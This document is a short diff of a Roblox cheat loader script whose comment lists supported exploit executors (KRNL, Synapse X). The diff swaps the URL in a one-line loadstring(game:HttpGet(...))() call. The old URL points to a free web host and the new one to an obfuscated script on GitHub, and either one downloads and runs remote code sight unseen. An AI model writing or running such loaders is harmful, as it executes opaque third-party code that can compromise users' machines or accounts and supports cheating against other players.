@@ -1,5 +1,5 @@
 --[[ 
 SUPPORTED EXPLOITS: KRNL,Synapse X,WRD api powered exploits
 --]]
-loadstring(game:HttpGet("https://qnlsploit.000webhostapp.com/Final_Xog083ELj6eE3F0a.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/NotMxth/mstudio45-Scripts/main/Build%20a%20Boat%20Obfuscated"))()
 --Key: No. (free)
